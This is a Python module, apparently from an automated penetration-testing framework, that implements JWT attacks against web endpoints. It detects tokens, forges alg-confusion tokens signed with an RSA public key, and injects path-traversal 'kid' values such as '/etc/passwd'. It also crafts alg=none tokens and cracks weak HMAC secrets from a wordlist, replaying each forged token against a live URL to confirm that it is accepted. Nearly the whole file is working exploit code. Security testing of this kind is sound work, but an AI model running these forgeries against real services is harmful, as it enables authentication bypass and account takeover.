"""JWT attack actions — alg-confusion, kid-injection, weak-secret crack."""

import base64
import hashlib
import hmac
import json
import re
from actions.registry import action, ActionContext, ActionResult
from tools.wrappers import curl


def _b64url(obj: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")


async def _jwt_request(url: str, token: str | None, location: str,
                       scheme: str = "Bearer") -> dict:
    """One authenticated-shaped request. `location` is "header" (default),
    "header:<Name>", "cookie:<name>" or "param:<name>". `no_session` keeps
    globally configured credentials out, so the verdict compares exactly
    the token under test against anonymous — not against ambient auth."""
    headers: dict = {}
    target = url
    if location == "header" or location.startswith("header:"):
        name = location.split(":", 1)[1] if ":" in location else "Authorization"
        value = f"{scheme} {token}" if scheme else str(token)
        if token is not None:
            headers[name] = value
    elif location.startswith("cookie:"):
        if token is not None:
            headers["Cookie"] = f"{location.split(':', 1)[1]}={token}"
    elif location.startswith("param:"):
        if token is not None:
            from core.validators import inject_param
            target = inject_param(url, location.split(":", 1)[1], token)
    try:
        result = await curl(target, headers=headers or None,
                            output="full", timeout=15, no_session=True)
    except Exception as exc:
        return {"status": 0, "body": "", "error": str(exc)}
    return {"status": result.get("status", 0),
            "body": result.get("body", "") or ""}


async def _differential_replay(url: str, original: str, forged: str,
                               location: str, scheme: str = "Bearer") -> tuple:
    """Accept / reject / inconclusive for a forged token.

    Three requests: anonymous, original, forged. Accepted means the
    forged token is treated like the valid one AND unlike anonymous.
    The anonymous comparison is load-bearing: on an endpoint that
    answers 200 to everything, every token "works" and nothing is proven.
    Returns ("accepted" | "rejected" | "inconclusive", evidence dict).
    """
    anon = await _jwt_request(url, None, location, scheme)
    base = await _jwt_request(url, original, location, scheme)
    forged_resp = await _jwt_request(url, forged, location, scheme)

    def same(a: dict, b: dict) -> bool:
        return a.get("status") == b.get("status") and \
            a.get("body", "") == b.get("body", "")

    evidence = {
        "anonymous": {"status": anon.get("status"),
                      "body_preview": str(anon.get("body", ""))[:200]},
        "original": {"status": base.get("status"),
                     "body_preview": str(base.get("body", ""))[:200]},
        "forged": {"status": forged_resp.get("status"),
                   "body_preview": str(forged_resp.get("body", ""))[:200]},
    }
    if same(forged_resp, base) and not same(base, anon):
        return "accepted", evidence
    if same(forged_resp, anon):
        return "rejected", evidence
    return "inconclusive", evidence


def decode_jwt_payload(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        # Add padding
        payload = parts[1]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return None


def decode_jwt_header(token: str) -> dict | None:
    try:
        parts = token.split(".")
        header = parts[0]
        padding = 4 - len(header) % 4
        if padding != 4:
            header += "=" * padding
        return json.loads(base64.urlsafe_b64decode(header))
    except Exception:
        return None


@action(
    id="auth.jwt.detect",
    risk="SAFE",
    detectability="low",
    requires=["url"],
    produces="JWTInfo",
    idempotent=True,
    timeout=30,
    description="Detect and decode JWT tokens in HTTP responses",
    category="auth",
)
async def detect_jwt(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    result = await curl(url, output="full")
    body = result.get("body", "")
    headers_raw = result.get("headers", "")
    # headers comes back as a raw string in "full" mode; parse key:value lines
    headers = {}
    for line in headers_raw.splitlines():
        if ":" in line and not line.startswith("HTTP/"):
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()

    # Look for JWT patterns in response body and headers
    jwt_pattern = r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"
    tokens = set(re.findall(jwt_pattern, body))

    for hdr_name, hdr_value in headers.items():
        if isinstance(hdr_value, str):
            found = re.findall(jwt_pattern, hdr_value)
            tokens.update(found)

    decoded_tokens = []
    for token in tokens:
        header = decode_jwt_header(token)
        payload = decode_jwt_payload(token)
        if header and payload:
            decoded_tokens.append({
                "token": token[:80] + "...",
                "header": header,
                "payload": payload,
            })

    if decoded_tokens:
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"tokens": decoded_tokens},
            evidence={"jwt": {"url": url, "tokens_found": len(decoded_tokens)}},
        )

    return ActionResult(False, error="no JWT tokens detected",
                        confidence="TENTATIVE",
                        data={"tokens_found": 0})


@action(
    id="auth.jwt.alg_confusion",
    risk="MEDIUM",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test JWT alg-confusion: sign HS256 with the RSA public key and replay differentially",
    category="auth",
)
async def jwt_alg_confusion(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    alg = header.get("alg", "")
    if not (alg.startswith("RS") or alg.startswith("ES")):
        return ActionResult(False, confidence="TENTATIVE",
                            data={"alg": alg},
                            error=f"alg {alg} not vulnerable to confusion")

    # Craft new header with alg: HS256
    new_header = dict(header)
    new_header["alg"] = "HS256"
    new_header_b64 = _b64url(new_header)
    parts = token.split(".")
    signing_input = f"{new_header_b64}.{parts[1]}"

    public_key = str(ctx.params.get("public_key", "") or "").strip()
    url = str(ctx.params.get("url", "") or "").strip()
    if not public_key or not url:
        # Confusion cannot be proven without the key to sign with and an
        # endpoint to replay against. The crafted token is evidence for
        # manual follow-up, not a finding.
        return ActionResult(
            success=False,
            confidence="TENTATIVE",
            data={
                "original_token": token[:80] + "...",
                "original_alg": alg,
                "crafted_signing_input": signing_input[:80] + "...",
                "technique": "alg_confusion",
            },
            error="crafted but unproven: needs public_key + url to sign and replay",
        )

    forged_sig = hmac.new(public_key.encode(), signing_input.encode(),
                          hashlib.sha256).digest()
    forged = f"{signing_input}." + base64.urlsafe_b64encode(forged_sig).decode().rstrip("=")
    location = str(ctx.params.get("token_location", "header"))
    scheme = str(ctx.params.get("auth_scheme", "Bearer"))
    verdict, evidence = await _differential_replay(url, token, forged,
                                                   location, scheme)
    if verdict == "accepted":
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"original_alg": alg, "technique": "alg_confusion",
                  "url": url},
            evidence={"jwt_alg_confusion": evidence},
        )
    return ActionResult(
        success=False,
        confidence="FIRM" if verdict == "inconclusive" else "TENTATIVE",
        data={"original_alg": alg, "technique": "alg_confusion"},
        error=f"confused token {verdict} (differential replay)",
    )


@action(
    id="auth.jwt.kid_injection",
    risk="MEDIUM",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test JWT kid header injection — replay traversed kids differentially",
    category="auth",
)
async def jwt_kid_injection(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    kid = header.get("kid", "")
    if not kid:
        return ActionResult(False, error="no kid header in JWT",
                            confidence="TENTATIVE")

    url = str(ctx.params.get("url", "") or "").strip()
    if not url:
        return ActionResult(
            success=False,
            confidence="TENTATIVE",
            data={
                "original_kid": kid,
                "technique": "kid_injection",
                "test_payloads": [
                    {"path": "/dev/null", "expect": "empty key"},
                    {"path": "/etc/passwd", "expect": "injection possible"},
                ],
            },
            error="kid present but not replayed — pass url to prove injection",
        )

    location = str(ctx.params.get("token_location", "header"))
    scheme = str(ctx.params.get("auth_scheme", "Bearer"))
    parts = token.split(".")
    for traversal in ("../../../../dev/null", "/etc/passwd",
                      "nonexistent-key-xyz123"):
        forged_header = _b64url({**header, "kid": traversal})
        forged = f"{forged_header}.{parts[1]}.{parts[2]}"
        verdict, evidence = await _differential_replay(url, token, forged,
                                                       location, scheme)
        if verdict == "accepted":
            return ActionResult(
                success=True,
                confidence="CONFIRMED",
                data={"original_kid": kid, "forged_kid": traversal,
                      "technique": "kid_injection", "url": url},
                evidence={"jwt_kid": evidence},
            )
        if verdict == "inconclusive":
            return ActionResult(
                success=False,
                confidence="FIRM",
                data={"original_kid": kid, "forged_kid": traversal,
                      "technique": "kid_injection"},
                error="traversed kid changes server behavior without clean "
                      "accept — kid influences verification",
            )
    return ActionResult(
        success=False,
        confidence="TENTATIVE",
        data={"original_kid": kid, "technique": "kid_injection"},
        error="traversed kids rejected like anonymous — not injectable",
    )


@action(
    id="auth.jwt.none_alg",
    risk="LOW",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=30,
    description="Test if the server accepts alg=none JWT tokens (replayed, not just crafted)",
    category="auth",
)
async def jwt_none_alg(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    parts = token.split(".")
    if len(parts) != 3:
        return ActionResult(False, error="invalid JWT token")

    payload = parts[1]
    no_alg_header = _b64url({"alg": "none", "typ": "JWT"})
    none_token = f"{no_alg_header}.{payload}."

    url = str(ctx.params.get("url", "") or "").strip()
    if not url:
        # Crafting is not testing. Without an endpoint the token is a
        # manual-testing artifact, and filing it would be the same
        # craft-without-replay pattern this rewrite removes.
        return ActionResult(
            success=False,
            confidence="TENTATIVE",
            data={
                "technique": "none_alg",
                "crafted_token": none_token[:80] + "...",
            },
            error="crafted but not replayed — pass url to prove acceptance",
        )

    location = str(ctx.params.get("token_location", "header"))
    scheme = str(ctx.params.get("auth_scheme", "Bearer"))
    verdict, evidence = await _differential_replay(url, token, none_token,
                                                   location, scheme)
    if verdict == "accepted":
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"technique": "none_alg", "url": url},
            evidence={"jwt_none_alg": evidence},
        )
    return ActionResult(
        success=False,
        confidence="FIRM" if verdict == "inconclusive" else "TENTATIVE",
        data={"technique": "none_alg"},
        error=f"alg=none token {verdict} (differential replay)",
    )


@action(
    id="auth.jwt.weak_secret_crack",
    risk="MEDIUM",
    detectability="low",
    requires=["token"],
    produces="VulnCandidate",
    tools=["hashcat"],
    idempotent=True,
    timeout=300,
    description="Crack weak JWT HMAC secrets using common password lists",
    category="auth",
)
async def jwt_weak_secret_crack(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    alg = header.get("alg", "")
    if "HS" not in alg:
        return ActionResult(False, confidence="TENTATIVE",
                            data={"alg": alg},
                            error=f"alg {alg} is not HMAC-based")

    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}.get(alg, hashlib.sha256)

    # Common weak secrets to test. Cracking is offline math: a recomputed
    # signature that matches IS the proof, no replay needed.
    weak_secrets = [
        "secret", "password", "123456", "admin", "token", "jwt",
        "key", "pass", "changeme", "abc123", "test", "qwerty",
        "secret123", "password123", "admin123", "letmein", "welcome",
        "superset_secret", "your-256-bit-secret", "jwtsecret",
    ]

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}"
    actual_sig = parts[2]

    def _matches(secret: str) -> bool:
        sig = hmac.new(secret.encode(), signing_input.encode(),
                       digest).digest()
        expected = base64.urlsafe_b64encode(sig).decode().rstrip("=")
        return expected == actual_sig

    for secret in weak_secrets:
        if _matches(secret):
            return ActionResult(
                success=True,
                confidence="CONFIRMED",
                data={
                    "secret": secret,
                    "token": signing_input,
                    "technique": "weak_secret_crack",
                },
                evidence={
                    "jwt_cracked": {
                        "secret": secret,
                        "signing_input": signing_input[:80],
                    }
                },
            )

        # Also test common salt variations
        for suffix in ["123", "!", "2024", "2025"]:
            salted = secret + suffix
            if _matches(salted):
                return ActionResult(
                    success=True,
                    confidence="CONFIRMED",
                    data={"secret": salted, "technique": "weak_secret_crack"},
                    evidence={"jwt_cracked": {"secret": salted}},
                )

    return ActionResult(False, error="no weak secret found",
                        confidence="TENTATIVE",
                        data={"secrets_tested": len(weak_secrets)})
